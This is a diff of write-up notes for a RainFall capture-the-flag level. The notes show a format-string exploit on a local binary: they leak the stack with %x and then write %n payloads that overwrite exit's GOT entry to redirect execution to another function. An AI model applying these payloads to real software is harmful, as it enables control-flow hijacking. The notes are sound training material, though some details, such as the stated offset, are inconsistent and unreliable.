@@ -13,7 +13,7 @@ Symbol table '.symtab' contains 73 entries:
 
 ```
 
-address of function o: 080484a4 -->  \xa4\x84\x04\x08
+address of function o: 080484a4 --> \xa4\x84\x04\x08
 
 ```bash
 level5@RainFall:~$ objdump -R level5 | grep exit
@@ -21,12 +21,24 @@ level5@RainFall:~$ objdump -R level5 | grep exit
 08049838 R_386_JUMP_SLOT   exit
 ```
 
-_exit: 08049828 --> \x28\x98\x04\x08
+\_exit: 08049828 --> \x28\x98\x04\x08
+
+level5@RainFall:~$ (python -c 'print ("AAAABBBB" + "%x " \* 20)';cat) | ./level5
+AAAABBBB200 b7fd1ac0 b7ff37d0 41414141 42424242 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520
+
+````
+
+offset of buffer of printf is `3`
 
 
 ```bash
 (python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
-```
+````
 
-payload +=
+(python -c 'print ("\x2a\x98\x04\x08" + "\x28\x98\x04\x08" + "%2052x" + "%8$n" + "%33956x" + "%9$n")'; cat) | ./level5
 
+payload += \x28\x98\x04\x08
+payload += \x2a\x98\x04\x08
+payload += %2052x --> 0804
+payload += %33956x --> 84a4
+payload += b'%8$n'
